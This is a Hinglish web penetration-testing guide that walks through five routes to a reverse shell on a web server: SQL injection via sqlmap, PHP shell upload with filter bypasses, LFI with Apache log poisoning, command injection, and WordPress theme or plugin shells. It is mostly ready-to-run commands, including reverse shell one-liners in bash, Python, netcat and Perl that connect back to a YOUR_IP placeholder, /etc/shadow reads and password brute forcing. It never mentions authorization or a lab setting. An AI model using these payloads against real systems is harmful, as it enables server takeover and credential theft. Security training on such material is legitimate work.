# WEB APP SE SHELL TAK — Full Chain Guide

---

## Ye Kya Hai?
Jab target pe port 80/443/8080 open ho (web server), toh web vulnerability exploit karke
server pe reverse shell lena hota hai. Ye multiple paths se ho sakta hai:
- SQL Injection → Shell
- File Upload → Shell
- LFI + Log Poisoning → Shell
- Command Injection → Shell
- WordPress Exploits → Shell

Har path detail mein samjhenge — kab kaunsa use karna hai, kyu kaam karta hai, aur output
mein kya expect karna hai.

---

## PEHLE YE KARO: WEB RECON (Har Baar)

### Step 1: Directory Bruteforce
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak
```
**Flags:**
- `dir` = Directory bruteforce mode
- `-x php,html,txt,bak` = In extensions ke saath bhi try karo
- Output mein `200` status = page exists, `301` = redirect, `403` = forbidden (interesting!)

### Step 2: Vulnerability Scanner
```bash
nikto -h http://<IP>
```
**Nikto kya karta hai:** Known vulnerabilities, misconfigurations, default files check karta hai

### Step 3: Manual Browsing
- Source code dekho (Ctrl+U) — comments mein hints hote hain
- `/robots.txt` check karo — hidden paths milte hain
- `/sitemap.xml` check karo
- Login page dikhe toh default creds try karo (admin:admin, admin:password)

---

## PATH 1: SQL INJECTION → SHELL

### SQLi Kya Hai?
Jab web app user input ko directly SQL query mein daalta hai bina sanitize kiye, toh tu
SQL commands inject kar sakta hai — database read kar sakta hai, aur kuch cases mein shell
bhi le sakta hai.

### Step 1: SQLi Detect Karo
Login page pe try karo:
```
Username: admin' OR 1=1 --
Password: anything
```
URL parameter mein:
```
http://<IP>/page.php?id=1'          ← Error aaya? SQLi hai!
http://<IP>/page.php?id=1' OR 1=1-- ← Sab rows dikhne lage? Confirmed!
```

### Step 2: SQLMap Se Automate Karo
```bash
# Basic:
sqlmap -u "http://<IP>/page.php?id=1" --dbs
# --dbs = saare databases list karo

# Tables:
sqlmap -u "http://<IP>/page.php?id=1" -D database_name --tables

# Data dump:
sqlmap -u "http://<IP>/page.php?id=1" -D database_name -T users --dump

# OS Shell (agar file write permission hai):
sqlmap -u "http://<IP>/page.php?id=1" --os-shell

# POST request (login form):
sqlmap -u "http://<IP>/login.php" --data="username=admin&password=test" --dbs
```

### Step 3: SQLMap Se Shell
```bash
sqlmap -u "http://<IP>/page.php?id=1" --os-shell
```
**Kab kaam karega:** Jab MySQL user ko FILE privilege ho aur web directory writable ho
**Kab nahi karega:** Most modern setups mein — tab manual upload ya doosra path use karo

---

## PATH 2: FILE UPLOAD → SHELL

### Concept:
Agar website pe file upload feature hai (profile pic, document, etc.), toh PHP reverse shell
upload karke execute kar sakte hain.

### Step 1: PHP Reverse Shell Banao
```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Ya Kali mein:
cp /usr/share/laudanum/php/php-reverse-shell.php shell.php
```
File edit karo — apna IP aur port daalo:
```php
$ip = 'YOUR_IP';      // Apna Kali ka IP
$port = 4444;          // Listener port
```

### Step 2: Upload Karo
- Seedha `.php` upload karo pehle
- Agar reject ho toh bypass try karo:

| Filter Bypass | Kaise |
|---|---|
| Extension filter | `shell.php5`, `shell.phtml`, `shell.pHp`, `shell.php.jpg` |
| Content-Type filter | Burp mein intercept karo, `Content-Type: image/jpeg` set karo |
| Magic bytes filter | File ke start mein `GIF89a` add karo (phir bhi .php extension) |
| Double extension | `shell.php.jpg` (Apache misconfiguration) |
| Null byte (old PHP) | `shell.php%00.jpg` |

### Step 3: Listener Start Karo (Apni Machine Pe)
```bash
nc -lvnp 4444
```

### Step 4: Shell Trigger Karo
Upload ki hui file ka URL open karo:
```
http://<IP>/uploads/shell.php
http://<IP>/images/shell.php
http://<IP>/upload/shell.php
```
Pata nahi kahan gayi? Gobuster se dhundho ya source code mein dekho.

---

## PATH 3: LFI + LOG POISONING → SHELL

### LFI (Local File Inclusion) Kya Hai?
Jab web app file path user input se leta hai:
```
http://<IP>/page.php?file=about.html
```
Toh tu system files padh sakta hai:
```
http://<IP>/page.php?file=../../../../etc/passwd
http://<IP>/page.php?file=../../../../etc/shadow
```

### Step 1: LFI Confirm Karo
```
http://<IP>/page.php?file=../../../../etc/passwd
```
Agar users ki list dikhne lagi (root:x:0:0:...) = LFI confirmed!

### Step 2: Log Poisoning Karo
**Concept:** Apache access log mein tera request record hota hai. Agar tu request mein PHP
code daale, aur phir LFI se log file include kare, toh PHP execute ho jaayega!

```bash
# Apache log mein PHP code inject karo:
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
# -A flag User-Agent set karta hai — ye log mein record hoga

# Ab LFI se log file include karo with command:
http://<IP>/page.php?file=../../../../var/log/apache2/access.log&cmd=id
# Agar "uid=33(www-data)" dikhe = RCE achieved!

# Reverse shell command daalo:
http://<IP>/page.php?file=../../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'
```

### Common Log Paths:
```
/var/log/apache2/access.log        (Debian/Ubuntu)
/var/log/apache/access.log         (Some distros)
/var/log/httpd/access_log          (CentOS/RHEL)
/var/log/nginx/access.log          (Nginx)
```

---

## PATH 4: COMMAND INJECTION → SHELL

### Command Injection Kya Hai?
Jab web app OS command execute karta hai user input ke saath (e.g., ping tool, DNS lookup):
```
Input: 127.0.0.1
App runs: ping 127.0.0.1
```
Tu extra command inject kar sakta hai:
```
Input: 127.0.0.1; whoami
App runs: ping 127.0.0.1; whoami    ← dono commands chalte hain!
```

### Step 1: Test Karo
```
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 && id
127.0.0.1 || id
`id`
$(id)
```
Agar kisi mein bhi `uid=` output aaya = Command Injection confirmed!

### Step 2: Reverse Shell Do
```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```
Agar special characters filter ho rahe:
```bash
# Base64 encode karo:
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC...
# Inject karo:
127.0.0.1; echo YmFzaCAtaSA... | base64 -d | bash
```

---

## PATH 5: WORDPRESS → SHELL

### Step 1: WordPress Detect & Enumerate
```bash
wpscan --url http://<IP> --enumerate u,p,t
# u = users, p = plugins, t = themes
```

### Step 2: WordPress Login Brute Force
```bash
wpscan --url http://<IP> -U admin -P /usr/share/wordlists/rockyou.txt
```

### Step 3: Admin Panel Se Shell (Login milne pe)
1. Appearance → Theme Editor jaao
2. 404.php (ya koi bhi PHP file) select karo
3. Saara content delete karo, PHP reverse shell paste karo
4. "Update File" click karo
5. Listener start karo: `nc -lvnp 4444`
6. Trigger: `http://<IP>/wp-content/themes/THEME_NAME/404.php`

### Alternative: Malicious Plugin Upload
```bash
# MSFvenom se plugin banao:
msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=4444 -f raw > shell.php
# shell.php ko zip karo plugin format mein
zip plugin.zip shell.php
```
WP Admin → Plugins → Add New → Upload Plugin → Activate → Trigger

---

## REVERSE SHELL LISTENER SETUP (Har Path Ke Liye Same)

### Netcat Listener (Simple):
```bash
nc -lvnp 4444
# -l = listen mode
# -v = verbose (connection dikhao)
# -n = DNS resolution mat karo (faster)
# -p 4444 = port number
```

### Useful Reverse Shell One-Liners (Target Pe Execute Karo):
```bash
# Bash:
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Python:
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat:
nc -e /bin/bash YOUR_IP 4444

# Perl:
perl -e 'use Socket;$i="YOUR_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

---

## SHELL UPGRADE — Raw Shell Se Proper Terminal

### Step 1: Python PTY Spawn
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ya:
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Step 2: Full Interactive Shell
```bash
export TERM=xterm
# Ctrl+Z (background)
stty raw -echo; fg
# Enter 2 baar press karo
```
**Ab kya milega:** Tab completion, arrow keys, Ctrl+C safe, clear command — full terminal!

---

## Common Mistakes (Mat Karna Ye)

1. **Listener start karna bhool jaana** — `nc -lvnp 4444` PEHLE run karo, phir trigger karo
2. **YOUR_IP mein target ka IP daalna** — Apna Kali IP daalo (listener wala)
3. **Port already in use** — `nc -lvnp 4444` fail ho toh doosra port try karo (4445, 9999)
4. **Shell upgrade nahi karna** — Raw shell mein bohot limitations hain
5. **File upload mein extension nahi change karna** — `.php` se `.phtml` etc try karo
6. **SQLMap mein POST data miss karna** — Login form ke liye `--data` flag use karo
7. **WordPress theme name galat** — `wpscan` output se exact theme name copy karo

---

## Quick Decision Tree

```
Port 80/443/8080 open hai
  |
  +-- gobuster + nikto + manual browse
  |
  +-- WordPress hai?
  |     +-- wpscan --enumerate --> user list
  |     +-- wpscan brute force --> admin login
  |     +-- Theme Editor --> PHP reverse shell
  |
  +-- Login page hai?
  |     +-- admin' OR 1=1 -- try karo
  |     +-- SQLi hai? --> sqlmap --> --os-shell ya dump creds
  |
  +-- File upload hai?
  |     +-- PHP reverse shell upload karo
  |     +-- Filter bypass: .php5, .phtml, GIF89a trick
  |
  +-- page.php?file= hai?
  |     +-- ../../../../etc/passwd try karo
  |     +-- LFI hai? --> Log Poisoning --> RCE
  |
  +-- Ping/lookup tool hai?
  |     +-- ; id ya | id try karo
  |     +-- Command Injection? --> Reverse shell one-liner
  |
  +-- HAR PATH KE LIYE:
        1. Listener pehle: nc -lvnp 4444
        2. Shell trigger karo
        3. Shell upgrade: python pty spawn
        4. Post-exploit: whoami, sudo -l, privesc
```
